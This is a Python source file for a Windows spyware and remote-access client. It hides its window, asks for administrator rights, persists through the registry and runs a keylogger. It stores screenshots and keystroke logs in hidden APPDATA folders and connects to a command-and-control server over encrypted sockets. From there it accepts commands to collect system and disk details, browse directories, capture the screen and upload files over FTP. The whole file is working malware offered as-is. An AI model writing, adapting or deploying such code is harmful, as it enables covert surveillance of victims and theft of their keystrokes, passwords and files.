from sys_info import get_sys_info, get_hdd_info
import socket, os, json, sys
from ftp_uploader import FTPs
from screenshotter import screen
from keylogger import key_logger
from helpers import *
from threading import Thread
import win32file
from win32event import CreateMutex
from win32api import GetLastError
from winerror import ERROR_ALREADY_EXISTS
from time import sleep
import ctypes
from ctypes import windll
from cryptography.fernet import Fernet
# encrypt traffic
KEY = b'ikex6DgCDdVjfwoyNrea9wJcj87bZNSVe6YZkDQQMDU='
F = Fernet(KEY)

# hide window
hideWindow()

# Use MUTEX in order to forbid two instances running simultaneously
name = sys.argv[0].split('\\')[-1]
mutex = CreateMutex(None,False,name)
last_error = GetLastError()
if last_error == ERROR_ALREADY_EXISTS:
	sys.exit(0)


def is_admin():
	try:
		return windll.shell32.IsUserAnAdmin()
	except:
		return False

if is_admin():
	# address of c&c
	HOST = '' 
	PORT = 65432 

	# tested only on windows
	if os.name is not 'nt':
		exit(0)
	try:
		update_registry()
	except Exception as e:
		pass

	# path to save screenShots
	screens_path = os.environ['APPDATA'] + os.sep + 'scrscr'
	# make sure the dir exists
	if os.path.isdir(screens_path) is False:
		os.mkdir(screens_path)
		win32file.SetFileAttributes(screens_path,win32file.FILE_ATTRIBUTE_READONLY)

	# path to save keyLogs
	logs_path = os.environ['APPDATA'] + os.sep + 'loglog' + os.sep
	# make sure the dir exists
	if os.path.isdir(logs_path) is False:
		os.mkdir(logs_path)
		win32file.SetFileAttributes(logs_path, win32file.FILE_ATTRIBUTE_READONLY)

	logs_path += 'loglog.txt'

	# get username
	uname = os.environ['USERNAME']
	# class that handles ftp
	ftps = FTPs(uname)

	# init keylogger class,pass optional ftp handler and start logging
	try:
		logger = key_logger(logs_path,ftps,screens_path)
		logger_thread = Thread(target = logger.start_logger)
		logger_thread.start()
	except Exception as e:
		pass

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	# added bool. to implement sock. reconection in case of connection loss
	connected = False

	while True:
		# if connected is False, try to reconnect
		if not connected:
			try:
				s.settimeout(10)
				s.connect((HOST, PORT))
				s.settimeout(None)
				connected = True
			except:
				sleep(10)
		else:
			try:
				# wait for command and complete it
				msg = str(F.decrypt(s.recv(2048)), encoding="utf-8")

				if msg == 'sys_info':
					js = get_sys_info()
					l = { "len":calc_len(js) }
					s.sendall(F.encrypt(bytes(json.dumps(l),encoding='utf-8')))
					s.sendall(F.encrypt(bytes(js,encoding='utf-8')))

				elif msg == 'hdd_info':
					js = get_hdd_info()
					l = { "len":calc_len(js) }
					s.sendall(F.encrypt(bytes(json.dumps(l),encoding='utf-8')))
					s.sendall(F.encrypt(bytes(js,encoding='utf-8')))

				elif msg.startswith('path:'):
					path = msg[5:]
					try:
						ans = os.listdir(path)
						js = {}
						js['files'] = {}
						js['dirs'] = []
						for a in ans:
							if os.path.isfile(path+a):
								size = os.path.getsize(path+a) / 2 ** 20
								js['files'][a] = "%.2f" % size
							else:
								js['dirs'].append(a)
						
					except:
						js = {'status': 'nok'}
					tosend = F.encrypt(bytes(json.dumps(js),encoding="utf-8"))
					l = { "len":len(tosend) }
					s.sendall(F.encrypt(bytes(json.dumps(l) ,encoding="utf-8" )))
					s.sendall(tosend)
				elif msg == 'screen_shot':
					try:
						screen(screens_path,ftps)
						status = 'Screenshot Taken!'
					except Exception as e:
						status = 'Failed to ScreenShot!'
					js = { "status":status }
					l = { "len":calc_len(json.dumps(js)) }
					s.sendall(F.encrypt(bytes(json.dumps(l) ,encoding="utf-8" )))
					s.sendall(F.encrypt(bytes(json.dumps(js),encoding="utf-8")))

				elif msg.startswith('file:'):
					path = msg[5:]
					ans = ftps.upload(path,'files')
					js = { 'status': ans }
					l = { "len":calc_len(json.dumps(js)) }
					s.sendall(F.encrypt(bytes(json.dumps(l),encoding="utf-8")))
					s.sendall(F.encrypt(bytes(json.dumps(js),encoding="utf-8")))

				else:
					pass

			except Exception as e:
				# in case of connection loss, make a new sock obj
				# and change the connection status to False
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.settimeout(10)
				connected = False
				pass
else:
	# if opened without admin privs. request to rerun self with admin privs.
	ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
